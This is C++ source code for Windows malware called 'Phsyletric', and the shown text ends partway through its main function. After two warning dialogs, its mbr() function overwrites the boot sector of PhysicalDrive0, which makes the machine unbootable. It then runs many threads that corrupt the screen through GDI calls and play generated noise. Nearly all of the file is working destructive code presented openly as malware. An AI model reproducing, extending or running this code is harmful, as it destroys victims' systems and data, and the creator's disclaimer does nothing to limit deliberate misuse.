//malware Phsyletric
#define _USE_MATH_DEFINES 1
#include <Windows.h>
#include <cmath>
#include "PhsyletricMBR.hpp"

#pragma comment(lib, "winmm.lib")

void mbr()
{    
    // Again SleepMod
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}

DWORD WINAPI payload1(LPVOID lpParam) {
    HDC desk = GetDC(0); // die
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), rx;
    while (1) {
        desk = GetDC(0);
        rx = rand() % sw;
        int ry = rand() % sh;
        if (rand() % 4 == 0) { BitBlt(desk, rx, 1, 10, sh, desk, rx, 0, SRCPAINT); Sleep(1); }
        else if (rand() % 4 == 1) { BitBlt(desk, rx, -1, -10, sh, desk, rx, 0, SRCPAINT); Sleep(1); }
        else if (rand() % 4 == 2) { BitBlt(desk, 1, ry, sw, 66, desk, 0, ry, SRCPAINT); Sleep(1); }
        else if (rand() % 4 == 3) { BitBlt(desk, -1, ry, sw, -66, desk, 0, ry, SRCPAINT); Sleep(1); }
    }
}
DWORD WINAPI payload2(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), rx;
    while (1) {
        desk = GetDC(0);
        SetStretchBltMode(desk, STRETCH_HALFTONE);
        if (rand() % 2 == 0) {
            int w = rand() % sw;
            int h = rand() % sh;
            for (int i = 5; i < 16; i++) {
                HRGN rgn = CreateEllipticRgn(w - w / i, h + h / i, w + 2000 / i, h - 950 / i);
                SelectClipRgn(desk, rgn);
                StretchBlt(desk, 1, 1, sw - 2, sh - 2, desk, 0, 0, sw, sh, SRCCOPY);
            }
        }
        else if (rand() % 2 == 1) {
            int w2 = rand() % sw;
            int h2 = rand() % sh;
            for (int i = 5; i < 16; i++) {
                HRGN rgn = CreateEllipticRgn(w2 - w2 / i, h2 + h2 / i, w2 + 2000 / i, h2 - 950 / i);
                SelectClipRgn(desk, rgn);
                StretchBlt(desk, -1, -1, sw + 2, sh + 2, desk, 0, 0, sw, sh, SRCCOPY);
            }
        }
    }
}
VOID WINAPI CircleInvert(int x, int y, int w, int h) {
    HWND hwnd = NULL;
    HDC hdc = GetDC(hwnd);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255))); // i like this
    BitBlt(hdc, x, y, w, h, hdc, x, y, 0x2837E28);
    SelectClipRgn(hdc, hrgn);
    DeleteObject(hrgn);
    ReleaseDC(hwnd, hdc);
}

DWORD WINAPI payload2dot1(LPVOID lpParam) {
    //H
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.top - 500, h = rect.bottom - rect.top - 500;

    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += 100)
        {
            CircleInvert(x - i / 2, y - i / 2, i, i);
            Sleep(25);
        }
    }
}
DWORD WINAPI payload3(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), rx;
    while (1) {
        desk = GetDC(0);
        int a = rand() % sw, b = rand() % sh;
        BitBlt(desk, a, b, sw, sh, desk, a + cos(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
        BitBlt(desk, a, b, -sw, -sh, desk, a + cos(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
        Sleep(5);
    }
}
DWORD WINAPI payload4(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    // Why suddenly using capital INT????
    INT sw = GetSystemMetrics(0);
    INT sh = GetSystemMetrics(1);
    int radius = 5.0f; // what the fuck put float value to int
    double moveangle = 0;
    while (true) {
        hdc = GetDC(0);
        double x = (cos(moveangle) * radius), y = (sin(moveangle) * radius); //epic gamer move
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));
        BitBlt(hdc, x, y, sw, sh, hdc, 0, 0, 0x9273ecef);
        BitBlt(hdc, x, y, sw, sh, hdc, 0, 0, SRCAND);
        Sleep(10);
        moveangle = fmod(moveangle + M_PI / radius, M_PI * radius);
    }
}
VOID WINAPI p1() {
    // Whyred code lmfao
    HDC desk;
    RECT wRect;
    POINT wPt[3];
    desk = GetDC(0);
    HDC deskMem = CreateCompatibleDC(desk);
    int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
    HBITMAP screenshot = CreateCompatibleBitmap(desk, xs, ys);
    SelectObject(deskMem, screenshot);
    GetWindowRect(GetDesktopWindow(), &wRect);
    wPt[0].x = wRect.left + 19;
    wPt[0].y = wRect.top - 90;
    wPt[1].x = wRect.right + 10;
    wPt[1].y = wRect.top + 18;
    wPt[2].x = wRect.left - 70;
    wPt[2].y = wRect.bottom - 90;
    PlgBlt(deskMem, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
    SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
    BitBlt(desk, 0, 0, xs, ys, deskMem, 0, 0, 0x2837E28);
    DeleteDC(desk);
    DeleteObject(screenshot);
    if (rand() % 10 == 4) InvalidateRect(0, 0, 0);
}
VOID WINAPI p2() {
    //Same as above
    HDC desk;
    RECT wRect;
    POINT wPt[3];
    desk = GetDC(0);
    HDC deskMem = CreateCompatibleDC(desk);
    int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
    HBITMAP screenshot = CreateCompatibleBitmap(desk, xs, ys);
    SelectObject(deskMem, screenshot);
    GetWindowRect(GetDesktopWindow(), &wRect);
    wPt[0].x = wRect.left - 19;
    wPt[0].y = wRect.top + 90;
    wPt[1].x = wRect.right - 10;
    wPt[1].y = wRect.top - 18;
    wPt[2].x = wRect.left + 70;
    wPt[2].y = wRect.bottom + 90;
    PlgBlt(deskMem, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
    SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
    BitBlt(desk, 0, 0, xs, ys, deskMem, 0, 0, 0x2837E28);
    DeleteDC(desk);
    DeleteObject(screenshot);
    if (rand() % 10 == 4) InvalidateRect(0, 0, 0);
}
DWORD WINAPI payload5(LPVOID lpParam) {
    while (1) {
       //Im gonna die
        p1();
        p2();
        p2();
        p1();
    }
}
DWORD WINAPI payload6(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), radius2 = 500.0f; // what the fuck float value
    double moveangle = 0;
    while (1) {
        desk = GetDC(0);
        int radius = 100, rx = rand() % sw, ry = rand() % sh;
        SetTextColor(desk, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(desk, RGB(rand() % 155, rand() % 155, rand() % 155));
        double ax = cos(moveangle) * radius2, ay = sin(moveangle) * radius2;
        StretchBlt(desk, ax, ay, sw, sh, desk, 0, 0, sw, sh, SRCCOPY);
        moveangle = fmod(moveangle + M_PI / radius2, M_PI * radius2);
        for (int t = 5; t < sw + sh; t++, t += 10) {
            int x = (int)(float)(radius + t / tan(t + radius * 10)) + rx,
                y = (int)(float)(radius + t / sin(t + radius * 10)) + ry;
            TextOutW(desk, x, y, L"Phsyletric", wcslen(L"Phsyletric"));
        }
        Sleep(10);
        if (rand() % 10 == 4) InvalidateRect(0, 0, 0);
    }
}
DWORD WINAPI payload7(LPVOID lpParam) {
    int sx = GetSystemMetrics(SM_CXSCREEN), sy = GetSystemMetrics(SM_CYSCREEN);
    int c = 0;
    for (int a = 0;; a++, a %= 9)
    {
        if (!a) RedrawWindow(0, 0, 0, 133);

        for (int t = 0; t < rand() % 3; t++)
        {
            for (int c = 0; c < rand() % 10; c++)
            {
                int y = rand() % sx, h = sy - rand() % sy - (sy / 2 - 58);
                int r = rand() % 3;
                HBRUSH brush;
                HDC hdc = GetDC(0);
                if (r == 0)
                {
                    brush = CreateSolidBrush(RGB(rand() % 100 + 155, 0, 0));
                    SelectObject(hdc, brush);
                }
                if (r == 1)
                {
                    brush = CreateSolidBrush(RGB(0, rand() % 100 + 155, 0));
                    SelectObject(hdc, brush);
                }
                if (r == 2)
                {
                    brush = CreateSolidBrush(RGB(0, 0, rand() % 100 + 155));
                    SelectObject(hdc, brush);
                }

                BitBlt(hdc, 0, y, sx, h, hdc, rand() % 244 - 112, y, SRCCOPY);
                PatBlt(hdc, 0, y, sx, h, PATINVERT);
            }
            Sleep(1);
        }
    }
    return 0;
}
DWORD WINAPI payload8(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), i = cos(0) + sin(1);
    while (1) {
        desk = GetDC(0);
        if (i < sw, i++)
            BitBlt(desk, tan(i), 0, sw, sh, desk, 0, 0, SRCCOPY);
        BitBlt(desk, -cos(i), 0, sw, sh, desk, 0, 0, SRCCOPY);
        BitBlt(desk, 0, sin(i), sw, sh, desk, 0, 0, SRCCOPY);
        BitBlt(desk, 0, -tan(i), sw, sh, desk, 0, 0, SRCCOPY);
    }
}
DWORD WINAPI payload9(LPVOID lpParam) {
    while (1) {
        int width, height;
        HWND hwnd;
        //Magnetar
        width = GetSystemMetrics(SM_CXSCREEN);
        height = GetSystemMetrics(SM_CYSCREEN);
        hwnd = GetDesktopWindow();    HDC hdc = GetDC(NULL);
        RECT rekt;
        GetWindowRect(hwnd, &rekt);
        HBRUSH rainbow = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, rainbow);
        int xyrng = rand() % width, h = height - rand() % width - (width / 2 - 110);

        POINT pt3[3];
        int inc3 = 60;
        inc3++;
        pt3[0].x = rekt.left + inc3;
        pt3[0].y = rekt.top - inc3;
        pt3[1].x = rekt.right + inc3;
        pt3[1].y = rekt.top + inc3;
        pt3[2].x = rekt.left - inc3;
        pt3[2].y = rekt.bottom - inc3;

        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

        BitBlt(hdc, xyrng, height, xyrng, h, hdc, rand() % 100 - 50, xyrng, SRCCOPY);
        PatBlt(hdc, xyrng, height, xyrng, h, PATINVERT);

        StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);
        StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
    }
}
DWORD WINAPI payload9dot2(LPVOID lpParam) {
    while (1) {
        HWND hwnd = GetDesktopWindow();
        HDC desktop = GetWindowDC(hwnd);
        HDC hdc = GetDC(NULL);
        RECT rekt;
        GetWindowRect(hwnd, &rekt);

        COLORREF clrrainbow = RGB(rand() % 255, rand() % 255, rand() % 255);

        for (int a = 0; a < rekt.right; a += 20)
        {
            for (int b = 0; b < rekt.bottom; b += 20)
            {
                SetPixel(hdc, a, b, clrrainbow);
            }
        }

        const double PI = 3.141592653589793238462643383279;
        const int xwave = 50;
        const int ywave = 100;
        for (double i = -2000; i < 2000; i += 0.01)
        {
            double j = sin(PI / xwave * i) * ywave;
            BitBlt(hdc, 200 + i, 200 + j, rekt.right, rekt.bottom, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, 400 + i, 400 + j, rekt.right, rekt.bottom, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, 600 + i, 600 + j, rekt.right, rekt.bottom, hdc, 0, 0, SRCCOPY);
        }
    }
}
DWORD WINAPI payload10(LPVOID lpParam) {
    while (1) {
        HWND hwnd = GetDesktopWindow();
        HDC desktop = GetWindowDC(hwnd);
        HDC hdc = GetDC(NULL);
        RECT rekt;
        GetWindowRect(hwnd, &rekt);
        SetStretchBltMode(hdc, STRETCH_HALFTONE);
        BitBlt(hdc, rekt.left + rand() % 1 + 1, rekt.top + rand() % 1 + 1, rekt.right + rand() % 1 + 1, rekt.bottom + rand() % 1 + 1, hdc, rekt.left, rekt.top, SRCPAINT);
        BitBlt(hdc, rekt.left + rand() % 1 - 1, rekt.top + rand() % 1 - 1, rekt.right + rand() % 1 + 1, rekt.bottom + rand() % 1 - 1, hdc, rekt.left, rekt.top, SRCINVERT);
        Sleep(10);
    }
}
DWORD WINAPI payload11(LPVOID lpParam) {
    HDC desktop = GetDC(NULL);
    int ScrW = GetSystemMetrics(SM_CXSCREEN), ScrM = GetSystemMetrics(SM_CYSCREEN); // why using macros
    while (1) {
        desktop = GetDC(NULL);
        if (rand() % 4 == 0) {
            BitBlt(desktop, 0, 0, ScrW, ScrM, desktop, -90, 20, SRCCOPY);
        }
        else if (rand() % 4 == 1) {
            BitBlt(desktop, 0, 0, ScrW, ScrM, desktop, 90, -20, SRCCOPY);
        }
        else if (rand() % 4 == 2) {
            BitBlt(desktop, 0, 0, ScrW, ScrM, desktop, -90, -20, SRCCOPY);
        }
        else if (rand() % 4 == 3) {
            BitBlt(desktop, 0, 0, ScrW, ScrM, desktop, 90, 20, SRCCOPY);
        }
        Sleep(1);
    }
}
VOID WINAPI zr1() {
    HDC desk = GetDC(0);
    int ScrW = GetSystemMetrics(SM_CXSCREEN), ScrM = GetSystemMetrics(SM_CYSCREEN);
    POINT wPt[3];
    RECT wRect;
    GetWindowRect(GetDesktopWindow(), &wRect);
    int c = 100;
    wPt[0].x = wRect.left + rand() % 110 - 50;
    wPt[0].y = wRect.top + rand() % 210 - 100;
    wPt[1].x = wRect.right + rand() % 210 - 100;
    wPt[1].y = wRect.top + rand() % 410 - 200;
    wPt[2].x = wRect.left + c - rand() % 210 - c;
    wPt[2].y = wRect.bottom - c + rand() % 210 - c;
    PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
    Sleep(2);
}
VOID WINAPI zr2() {
    HDC desk = GetDC(0);
    int ScrW = GetSystemMetrics(SM_CXSCREEN), ScrM = GetSystemMetrics(SM_CYSCREEN);
    POINT wPt[3];
    RECT wRect;
    GetWindowRect(GetDesktopWindow(), &wRect);
    int c = 100;
    wPt[0].x = wRect.left - rand() % 110 + 50;
    wPt[0].y = wRect.top - rand() % 210 + 100;
    wPt[1].x = wRect.right - rand() % 210 + 100;
    wPt[1].y = wRect.top - rand() % 410 + 200;
    wPt[2].x = wRect.left - c + rand() % 210 + c;
    wPt[2].y = wRect.bottom + c - rand() % 210 + c;
    PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
    Sleep(2);
}
DWORD WINAPI payload12(LPVOID lpParam) {
    while (1) { //die
        zr1();
        zr2();
        zr2();
        zr1();
    }
}
DWORD WINAPI payload13(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        desk = GetDC(0);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        PatBlt(desk, 0, 0, sw, sh, PATINVERT);
        Sleep(1000);
    }
}
DWORD WINAPI payload13dot2(LPVOID lpParam) {
    HDC desk = GetDC(0);
    POINT pt;
    CURSORINFO curinf;
    while (1) {
        desk = GetDC(0);
        GetCursorPos(&pt);
        GetCursorInfo(&curinf);
        curinf.cbSize = sizeof(curinf);
        DrawIcon(desk, pt.x, pt.y, curinf.hCursor);
    }
}
DWORD WINAPI payload13dot3(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        desk = GetDC(0);
        int radius = 10, rx = rand() % sw, ry = rand() % sh, num = rand() % 5;
        for (int t = 0; t < sw + sh; ++t) {
            int x = (int)(float)(radius + t * tan(t + radius * 3) + rx), //eeeeeeeeeeeeeeee
                y = (int)(float)(radius + t * cos(t + radius * 3) + ry);
            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }
            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_WARNING)); Sleep(0.99); }
            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_INFORMATION)); Sleep(0.99); }
            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_INFORMATION)); Sleep(0.99); }
            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ASTERISK)); Sleep(0.99); }
        }
        InvalidateRect(0, 0, 0);
    }
}
DWORD WINAPI payload13dot4(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        desk = GetDC(0);
        SetStretchBltMode(desk, STRETCH_HALFTONE);
        StretchBlt(desk, 30, 30, sw - 60, sh - 60, desk, sw, sh, -sw, -sh, SRCCOPY);
        Sleep(150);
    }
}
DWORD WINAPI payload13dot5(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        desk = GetDC(0);
        int x1 = (rand() % sw - 400);
        int y1 = (rand() % sw - 400);
        int x2 = (rand() % sw - 400);
        int y2 = (rand() % sw - 400);
        int w = (rand() % 400);
        int h = (rand() % 400);
        BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? SRCERASE : NOTSRCERASE);
        BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? NOTSRCCOPY : SRCPAINT);
        BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? SRCCOPY : SRCAND);
        Sleep(150);
    }
}
DWORD WINAPI payload14(LPVOID lpParam) {
    HWND upWnd = GetForegroundWindow();
    HDC upHdc = GetDC(upWnd);
    HDC desk = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    while (true) {
        upWnd = GetForegroundWindow();
        upHdc = GetDC(upWnd);
        desk = GetDC(NULL);
        POINT c;
        GetCursorPos(&c);
        BitBlt(desk, -1, 1, sw, sh, desk, 2, 2, NOTSRCCOPY);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        BitBlt(desk, -rand() % 15, rand() % 15, sw, sh, desk, -rand() % 11, rand() % 11, 0x2837E28);
        DrawIcon(desk, c.x, c.y, LoadIcon(0, IDI_ERROR));
    }
}
DWORD WINAPI payload15(LPVOID lpParam) {
    //Nikitpad codes
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc, hdcMem; HBITMAP hbm;
    for (int i = 0;; i++, i %= 6) {
        hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i * w + i, y = i * h + i, f = (y | y + y + -1 + x + w / h);
            ((BYTE*)(data + i))[2] = (f / 1);
        }
        SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
        DeleteObject(hbm); DeleteObject(hdcMem);
        DeleteObject(hdc);
        Sleep(rand() % 100);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 3) * (t >> 4) - t * tan(t >> 1);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 8) * (t >> 4) + t * tan(t >> 3);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 15] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 1) * (t >> 0) - t * tan(t >> 6);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 6) * (t >> 8) + t * tan(t >> 9);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 6) * (t >> 6) - t * tan(t >> 6);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 15] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 0) * (t >> 1) + t * tan(t >> 4);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 88)) ^ (95 & t) ^ (7879 & t) - t / 16;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 11 | t >> 9 | t >> 1 | t >> 1 | t * 9 | t >> 1 | t * 6);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 20] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 1)) ^ (1 & t) ^ (1 & t) - t / 9 | t * 29 | t * 7 | t >> 9;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 20] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 1)) ^ (1 & t) ^ (1 & t) - t / 9 | t * 29 | t * 7 | t >> 9;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
    //Memz again
    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Phsyletric", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Phsyletric", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
           // I pretty sure there will be memory leaks
            mbr();
            HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, payload2dot1, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2);
            CloseHandle(thread2dot1);
            InvalidateRect(0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
            sound3();
            Sleep(15000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
